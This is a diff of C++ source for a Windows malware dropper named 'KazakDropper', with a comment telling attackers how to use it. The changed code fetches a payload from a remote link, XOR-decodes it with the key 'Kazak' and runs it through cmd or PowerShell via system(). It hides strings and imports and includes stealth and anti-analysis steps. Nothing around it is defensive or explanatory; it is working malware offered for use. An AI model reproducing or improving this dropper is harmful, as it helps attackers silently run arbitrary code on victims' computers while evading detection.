@@ -1,10 +1,10 @@
 
 /* How to create an attack using this dropper you may ask, well i gotchu
 
-1. Get your DLL bytes using a Hex Editor and export them as C bytes
-2. Encrypt your DLL bytes using the same algorithm used to decrypt them here and put them inside a text file on your server.
-3. Put the link inside the source code.
-4. That's it , enjoy.
+1. Put your payload inlined inside a text file on a webserver, be sure it works and u tested it.
+2. Edit the link to where the raw payload is stored.
+3. In case of POWERSHELL payloads and not Command Prompt commands, be sure to put "powershell" in front of the payload.
+4. Enjoy.
 
 */
 
@@ -116,34 +116,46 @@ void KazakDropper::PreparePayload()
 
 	S.PayloadLink = enc("RAW PAYLOAD LINK");
 	S.EncryptedPayload = KazakUtils::StringWrapper(S.PayloadLink);
+	S.XorKey = enc("Kazak");
 
 	for (int x = 0; x < 10; x++)
 		S.DecryptedPayload[x] = S.EncryptedPayload[x] ^ S.XorKey[x];
+
+
 
 }
 
 void KazakDropper::DropPayload(std::string payload)
 {
-	li(system)(payload.c_str());
+	Storage S;
+	if (!payload.find(enc("powershell")))
+		S.CmdPayload = true;
+	else
+		S.PowerShellPayload = true;
+
+	if (S.CmdPayload)
+		li(system)(payload.c_str());
+	else
+		li(system)(enc("powershell") + payload);
+
 }
 
 int main()
 {
 	Storage S;
 
+	while (!li(InternetCheckConnectionA)(enc("https://google.com"), FLAG_ICC_FORCE_CONNECTION, 0))
+		Sleep(1000);
+
+	KazakDropper::Stealth();
+
 	while (!KazakDropper::EvadeAnalysis())
 	{
-		KazakDropper::Stealth();
-
-		while (!li(InternetCheckConnectionA)(enc("https://google.com"), FLAG_ICC_FORCE_CONNECTION, 0))
-			Sleep(1000);
-
-
 		KazakDropper::PreparePayload();
 		
 		KazakDropper::DropPayload(S.DecryptedPayload);
 
-		return 0;
+		exit(-1);
 
 	}
 
